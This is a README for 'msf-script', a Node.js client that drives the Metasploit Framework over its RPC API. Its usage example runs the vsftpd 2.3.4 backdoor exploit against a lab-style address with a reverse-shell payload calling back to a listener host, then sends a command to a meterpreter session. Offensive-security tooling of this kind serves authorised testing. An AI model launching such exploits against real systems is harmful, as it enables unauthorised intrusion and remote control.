# msf-script

Metasploit RPC client for Node.js — HTTP + MessagePack.

Talks to [msfrpcd](https://docs.rapid7.com/metasploit/rpc-api/) over HTTP(S) using MessagePack serialization. Used by [`pi-metasploit`](../pi-metasploit/) to drive the Metasploit Framework.

## Usage

```typescript
import { MsfRpcClient } from "msf-script";

const client = new MsfRpcClient({
  host: "127.0.0.1",
  port: 55553,
  password: "yourpassword",
  ssl: false,  // msfrpcd -S disables SSL
});

await client.connect();

// List sessions
const sessions = await client.sessionList();

// Run an exploit
const result = await client.moduleExecute("exploit", "unix/ftp/vsftpd_234_backdoor", {
  RHOSTS: "10.10.10.5",
  PAYLOAD: "cmd/unix/reverse",
  LHOST: "10.10.14.5",
});

// Send a command to a meterpreter session
const output = await client.sessionCommand(1, "getuid");
console.log(output); // "Server username: NT AUTHORITY\SYSTEM"
```

## API coverage

- **Auth**: login, logout, token management
- **Core**: version, module stats, reload, globals
- **Modules**: list/search (exploits, auxiliary, post, payloads, encoders), info, options, compatible payloads, execute, check, results
- **Jobs**: list, info, stop
- **Sessions**: list, stop, shell read/write, meterpreter read/write/run_single, command (auto-detects shell vs meterpreter)
- **Consoles**: create, destroy, list, write, read, `consoleCommand()` (temp console + auto-cleanup)
- **Plugins**: load, unload, list

## Tests

```bash
cd msf-script && npx vitest run   # 6 unit tests (client construction)
```

## License

MIT
